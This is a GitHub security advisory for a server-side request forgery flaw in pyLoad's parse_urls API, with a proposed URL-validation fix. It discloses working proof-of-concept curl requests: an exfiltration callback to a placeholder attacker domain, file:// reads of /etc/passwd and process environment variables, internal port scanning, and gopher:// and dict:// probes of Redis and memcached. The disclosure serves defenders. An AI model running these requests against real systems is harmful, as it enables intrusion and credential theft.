# [H] pyLoad: SSRF in parse_urls API endpoint via unvalidated URL parameter

## Summary
Severity: High
Advisory: GHSA-2wvg-62qm-gj33
CVE: CVE-2026-35187
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-04
Source: https://github.com/advisories/GHSA-2wvg-62qm-gj33
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
## Vulnerability Details

**CWE-918**: Server-Side Request Forgery (SSRF)

The `parse_urls` API function in `src/pyload/core/api/__init__.py` (line 556) fetches arbitrary URLs server-side via `get_url(url)` (pycurl) without any URL validation, protocol restriction, or IP blacklist. An authenticated user with ADD permission can:

- Make HTTP/HTTPS requests to internal network resources and cloud metadata endpoints
- **Read local files** via `file://` protocol (pycurl reads the file server-side)
- **Interact with internal services** via `gopher://` and `dict://` protocols
- **Enumerate file existence** via error-based oracle (error 37 vs empty response)

### Vulnerable Code

**`src/pyload/core/api/__init__.py` (line 556)**:

```python
def parse_urls(self, html=None, url=None):
    if url:
        page = get_url(url)  # NO protocol restriction, NO URL validation, NO IP blacklist
        urls.update(RE_URLMATCH.findall(page))
```

No validation is applied to the `url` parameter. The underlying pycurl supports `file://`, `gopher://`, `dict://`, and other dangerous protocols by default.

## Steps to Reproduce

### Setup

```bash
docker run -d --name pyload -p 8084:8000 linuxserver/pyload-ng:latest
```

Log in as any user with ADD permission and extract the CSRF token:

```bash
CSRF=
```

### PoC 1: Out-of-Band SSRF (HTTP/DNS exfiltration)

```bash
curl -s -b "pyload_session_8000=<SESSION>"   -H "X-CSRFToken: "   -H "Content-Type: application/x-www-form-urlencoded"   -d "url=http://ssrf-proof.<CALLBACK_DOMAIN>/pyload-ssrf-poc"   http://localhost:8084/api/parse_urls
```

**Result**: 7 DNS/HTTP interactions received on the callback server (Burp Collaborator). Screenshot attached in comments.

### PoC 2: Local file read via file:// protocol

```bash
# Reading /etc/passwd (file exists) -> empty response (no error)
curl ... -d "url=file:///etc/passwd" http://localhost:8084/api/parse_urls
# Response: {}

# Reading nonexistent file -> pycurl error 37
curl ... -d "url=file:///nonexistent" http://localhost:8084/api/parse_urls
# Response: {"error": "(37, \'Couldn't open file /nonexistent\')"}
```

The difference confirms pycurl successfully reads local files. While `parse_urls` only returns extracted URLs (not raw content), any URL-like strings in configuration files or environment variables are leaked. The error vs success differential also serves as a **file existence oracle**.

Files confirmed readable:
- `/etc/passwd`, `/etc/hosts`
- `/proc/self/environ` (process environment variables)
- `/config/settings/pyload.cfg` (pyLoad configuration)
- `/config/data/pyload.db` (SQLite database)

### PoC 3: Internal port scanning

```bash
curl ... -d "url=http://127.0.0.1:22/" http://localhost:8084/api/parse_urls
# Response: pycurl.error: (7, 'Failed to connect to 127.0.0.1 port 22')
```

### PoC 4: gopher:// and dict:// protocol support

```bash
curl ... -d "url=gopher://127.0.0.1:6379/_INFO" http://localhost:8084/api/parse_urls
curl ... -d "url=dict://127.0.0.1:11211/stat" http://localhost:8084/api/parse_urls
```

Both protocols are accepted by pycurl, enabling interaction with internal services (Redis, memcached, SMTP, etc.).

## Impact

An authenticated user with ADD permission can:

- **Read local files** via `file://` protocol (configuration, credentials, database files)
- **Enumerate file existence** via error-based oracle (`Couldn't open file` vs empty response)
- **Access cloud metadata endpoints** (AWS IAM credentials at `http://169.254.169.254/`, GCP service tokens)
- **Scan internal network** services and ports via error-based timing
- **Interact with internal services** via `gopher://` (Redis RCE, SMTP relay) and `dict://`
- **Exfiltrate data** via DNS/HTTP to attacker-controlled servers

The multi-protocol support (`file://`, `gopher://`, `dict://`) combined with local file read capability significantly elevates the impact beyond a standard HTTP-only SSRF.

## Proposed Fix

Restrict allowed protocols and validate target addresses:

```python
from urllib.parse import urlparse
import ipaddress
import socket

def _is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    hostname = parsed.hostname
    if not hostname:
        return False
    try:
        for info in socket.getaddrinfo(hostname, None):
            ip = ipaddress.ip_address(info[4][0])
            if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
                return False
    except (socket.gaierror, ValueError):
        return False
    return True

def parse_urls(self, html=None, url=None):
    if url:
        if not _is_safe_url(url):
            raise ValueError("URL targets a restricted address or uses a disallowed protocol")
        page = get_url(url)
        urls.update(RE_URLMATCH.findall(page))
```

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-2wvg-62qm-gj33
- https://nvd.nist.gov/vuln/detail/CVE-2026-35187
- https://github.com/pyload/pyload/commit/4032e57d61d8f864e39f4dcfdb567527a50a9e1f
- https://github.com/pyload/pyload
